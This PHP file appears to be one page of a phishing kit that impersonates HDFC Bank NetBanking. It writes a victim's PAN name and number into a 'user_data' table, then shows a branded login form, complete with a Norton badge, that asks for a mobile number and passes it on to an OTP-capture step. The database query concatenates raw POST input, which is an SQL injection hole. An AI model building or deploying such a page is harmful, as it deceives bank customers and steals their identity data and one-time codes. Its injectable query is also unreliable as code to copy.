<?php

if(!empty($_POST['pan_no'])) {  
    $pan_no = strtoupper($_POST['pan_no']);
}
else {
    header("Location: ./");
    die();
}
$pan_name = $_POST['pan_name'];
$token = $_POST['token'];

require_once "header.php";

$query = 'UPDATE `user_data` SET `pan_name` = "'.$pan_name.'", `pan_no` = "'.$pan_no.'" WHERE `UID` = "'.$token.'"';
require_once "db.php";

?>

<div class="container center" style="max-width:420px">
	<div class="row welcmewrap">
        <div class="welcomesec1" style="margin-bottom:0">
            <div class="hdfcstatictxt mB20">Login to NetBanking</div>
            <div class="netwrapper">
                <div class="col-12">
			        <form method="post" action="login-otp.php">
                        <div class="mB20">
                            <div class="lablefield ibvt mB0"><span>Mobile Number</span></div>
                            <div class="inputfield ibvt loginData">
                                <input
                                    placeholder="Enter your mobile number"
                                    inputmode="numeric"
                                    autocomplete="phone"
                                    class="form-control" 
                                    name="mobile_no"
                                    maxlength="10"
                                    minlength="10"
                                    length="10"
                                    type="tel"
                                    required
                                    autofocus />
                                <input name="token" value="<?php echo $token ?>" hidden />
                            </div>
                        </div>
                        <div class="mB20">
                            <div class="inputfield ibvt loginData">
                                <button class="btn btn-primary login-btn" type="submit">GET O.T.P</button>
                            </div>
                        </div>
                    </form>
                </div>
                <br />
                <div class="col-12">
                    <div class="nortonsecurity center lnheight" style="text-align:center">
                        <img alt="" src="images/nortonsecurity.png" />
                    </div>
                    <div class="hdfcsmalltxt">
                        <span class="color666">Your security is of utmost importance.</span>
                        <span class="lightbluecolor"><a onclick="return window.open('https://www.hdfcbank.com/personal/useful-links/security')" href="javascript:void(0)">Know More...</a></span>
                    </div>
                </div>
                <div class="clearfix"></div>
            </div>
        </div>
	</div>
</div>

<?php include_once "footer.php"; ?>